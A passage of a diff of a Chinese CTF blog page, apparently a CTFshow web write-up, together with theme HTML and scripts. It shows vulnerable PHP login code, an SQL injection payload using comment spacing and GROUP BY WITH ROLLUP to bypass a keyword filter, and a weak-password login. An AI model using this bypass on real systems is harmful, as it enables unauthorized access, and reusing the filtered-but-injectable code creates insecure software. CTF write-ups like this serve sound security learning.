class="hljs-variable">$password</span>)))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;sql inject error&quot;</span>);<br>		&#125;<br>		<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>		<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br>			<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>					<span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>						<span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>==<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br>							<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登陆成功&lt;br&gt;&quot;</span>;<br>							<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>						&#125;<br><br>					 &#125;<br>			&#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>可以看到select，sleep 等等都被过滤了</p>
 <p>同时没有办法使用双写绕过</p>
@@ -469,354 +317,393 @@
 <p>group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计</p>
 <p><code>with rollup</code>的作用是：在最后记录后面新增一行，显示select查询时聚合函数的统计和计算结果</p>
 <p>也就是</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> 列名  <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">ROLLUP</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> 列名  <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span></span><br></pre></td></tr></table></figure>
 
 <p>这是不使用WITH ROLLUP的效果</p>
-<p><img src="/posts/fa386b67/image-20220312224015749.png" srcset="/img/loading.gif" lazyload alt="image-20220312224015749"></p>
+<p><img src="/posts/fa386b67/image-20220312224015749.png" alt="image-20220312224015749"></p>
 <p>这是使用WITH ROLLUP的效果</p>
-<p><img src="/posts/fa386b67/image-20220312224040151.png" srcset="/img/loading.gif" lazyload alt="image-20220312224040151"></p>
+<p><img src="/posts/fa386b67/image-20220312224040151.png" alt="image-20220312224040151"></p>
 <p>可以看出多了一行password多出了一个NULL对应的值为4也就是前面2+1+1的值 也就是说在group by的基础上WITH ROLLUP又把前面的值汇总了一遍</p>
 <p>利用这一特性我们就可以进行绕过</p>
 <p>payload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/fa386b67/image-20220312224702958.png" srcset="/img/loading.gif" lazyload alt="image-20220312224702958"></p>
+<p><img src="/posts/fa386b67/image-20220312224702958.png" alt="image-20220312224702958"></p>
 <p>拿到flag</p>
-<p><img src="/posts/fa386b67/image-20220312224233107.png" srcset="/img/loading.gif" lazyload alt="image-20220312224233107"></p>
+<p><img src="/posts/fa386b67/image-20220312224233107.png" alt="image-20220312224233107"></p>
 <h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><p>打开靶机发现一个登录界面，试下弱口令</p>
 <p>admin admin888</p>
-<p><img src="/posts/fa386b67/image-20220306182257359.png" srcset="/img/loading.gif" lazyload alt="image-20220306182257359"></p>
+<p><img src="/posts/fa386b67/image-20220306182257359.png" alt="image-20220306182257359"></p>
 <p>看到一张图片F12看下源码</p>
-<p><img src="/posts/fa386b67/image-20220306182357918.png" srcset="/img/loading.gif" lazyload alt="image-20220306182357918"></p>
+<p><img src="/posts/fa386b67/image-20220306182357918.png" alt="image-20220306182357918"></p>
 <p>发现一行神秘编码 base64解码下</p>
-<p><img src="/posts/fa386b67/image-20220306182428648.png" srcset="/img/loading.gif" lazyload alt="image-20220306182428648"></p>
+<p><img src="/posts/fa386b67/image-20220306182428648.png" alt="image-20220306182428648"></p>
 <p>发现只有一半 接下来找一找另一半</p>
 <p>把图片下载下来</p>
 <p>在详细信息里发现了</p>
-<p><img src="/posts/fa386b67/image-20220306182517451.png" srcset="/img/loading.gif" lazyload alt="image-20220306182517451"></p>
+<p><img src="/posts/fa386b67/image-20220306182517451.png" alt="image-20220306182517451"></p>
 <p>解码</p>
-<p><img src="/posts/fa386b67/image-20220306182543998.png" srcset="/img/loading.gif" lazyload alt="image-20220306182543998"></p>
+<p><img src="/posts/fa386b67/image-20220306182543998.png" alt="image-20220306182543998"></p>
 <p>搞定提交</p>
-<p><img src="/posts/fa386b67/image-20220306182802861.png" srcset="/img/loading.gif" lazyload alt="image-20220306182802861"></p>
+<p><img src="/posts/fa386b67/image-20220306182802861.png" alt="image-20220306182802861"></p>
 <p>？？？ 假的flag改了大小写还是不行重新试下</p>
 <p>登录抓包</p>
-<p><img src="/posts/fa386b67/image-20220306183022208.png" srcset="/img/loading.gif" lazyload alt="image-20220306183022208"></p>
+<p><img src="/posts/fa386b67/image-20220306183022208.png" alt="image-20220306183022208"></p>
 <p>我去。。。。</p>
 <p>base解码这次成功了。。</p>
 
-                
-              </div>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
             
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/ctf/">#ctf</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>CTFshow_web刷题记录[持续更新......]</div>
-      <div>http://example.com/posts/fa386b67/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>F4tty</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年3月6日</div>
-        </div>
-      
-      
-      <div class="license-meta-item">
-        <div>许可协议</div>
-        <div>
-          
-            
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-              <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                <i class="iconfont icon-by"></i>
-              </span>
+              <a href="/posts/cb677a8d/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
               </a>
             
-          
-        </div>
-      </div>
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/posts/8c5d5e49/" title="Vulnhub XXE靶机渗透记录">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Vulnhub XXE靶机渗透记录</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/posts/cb677a8d/" title="Clash RCE漏洞复现分析">
-                        <span class="hidden-mobile">Clash RCE漏洞复现分析</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-03-06 00:00:00
+            </span>
             
-          </article>
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/ctf/" title="ctf">
+                        #ctf
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/8c5d5e49/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
         </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
       
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-text">Web刷题记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-text">Web签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web2"><span class="toc-text">Web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web3"><span class="toc-text">Web3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web4"><span class="toc-text">Web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web5"><span class="toc-text">Web5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web6"><span class="toc-text">Web6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web7"><span class="toc-text">Web7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web8"><span class="toc-text">Web8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web9"><span class="toc-text">Web9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web10"><span class="toc-text">Web10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%90%8C%E6%96%B0%E4%B8%93%E5%B1%9E%E7%BA%A2%E5%8C%85%E9%A2%98"><span class="toc-text">萌新专属红包题</span></a></li></ol></li></ol>
+      
     </div>
   </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
 </div>
 
 
+<script src="/js/backtotop.js"></script>
 
 
 
-  
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
 
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
       </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+      <div class="search-result" id="search-result"></div>
     </div>
   </div>
-</div>
 
-    
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
 
-    
-  </main>
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
 
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-  
-</div>
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
 
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
       }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
   </script>
 
 
 
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      collapseDepth   : CONFIG.toc.collapseDepth || 0,
-      scrollSmooth    : true,
-      headingsOffset  : -boardTop
-    });
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
 
   
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-  });
-</script>
+<script src="/js/colorscheme.js"></script>
 
 
+
+
+
+        
   
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CTFshow_web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%5B%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0......%5D + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Ffa386b67%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/fa386b67/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
+  
+<script src="/js/shares.js"></script>
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-</body>
+
+
+      </div>
+    </div>
+  </body>
 </html>
